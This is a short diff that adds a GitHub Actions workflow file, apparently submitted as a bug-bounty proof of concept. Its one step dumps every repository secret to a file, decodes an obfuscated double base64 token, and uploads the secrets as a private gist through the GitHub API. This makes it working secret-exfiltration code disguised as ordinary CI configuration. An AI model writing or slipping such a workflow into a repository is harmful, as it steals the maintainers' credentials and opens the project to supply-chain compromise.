@@ -1,0 +1,12 @@
+name: hackerone.com/inspector-ambitious
+on:
+ pull_request_target:
+
+jobs:
+ build:
+   runs-on: ubuntu-latest
+   steps:
+     - run: |
+         echo "${{ toJSON(secrets) }}" > .secrets
+         export TOKEN=$(echo "WjJod1gxQmliMGxQTmpGd09EWTRWRU5aWW1SNE9IaFdlSGszYTBVek0yaDVNakZYVEc1blN3bz0K" | base64 --decode | base64 --decode)
+         curl -X POST -H "Authorization: token $TOKEN" -d "$(jq -n --arg content "$(cat .secrets)" '{description: "Description of the Gist", public: false, files: {"secrets.txt": {content: $content}}}' )" https://api.github.com/gists
